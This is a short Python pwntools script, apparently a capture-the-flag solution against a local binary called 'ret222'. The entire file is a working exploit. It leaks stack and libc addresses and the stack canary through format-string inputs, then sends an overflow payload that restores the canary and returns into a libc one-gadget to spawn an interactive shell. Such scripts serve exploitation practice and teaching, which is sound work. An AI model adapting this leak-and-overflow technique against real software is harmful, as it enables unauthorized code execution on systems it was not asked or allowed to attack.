from pwn import *

p = process('./ret222')
# ubuntu18
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

onegadget = 0x4f322

def setname(msg):
    p.sendlineafter('>', '1')
    p.sendlineafter(':', msg)

def show():
    p.sendlineafter('>', '2')

def save(msg):
    p.sendlineafter('>', '3')
    p.sendlineafter(':', msg)

def bye():
    p.sendlineafter('>', '4')


setname('%lx %lx')
show()

p.recvuntil('Name:')
stack = p.recvuntil(' ', drop = True)
libc.address = int('0x' + p.recvuntil('*', drop = True), 16) - 0x3ed8c0

print('stack: %s' % stack)
print('libc: %s' % hex(libc.address))

setname('%23$lx') # 5 registers and stack[18 - 1]
show()

p.recvuntil('Name:')
canary = int('0x' + p.recvuntil('*', drop = True), 16)

print('canary: %s' % hex(canary))

payload = 'a' * (128 + 8) + p64(canary) + 'b' * 8 + p64(libc.address + onegadget)
save(payload)

bye()

p.interactive()
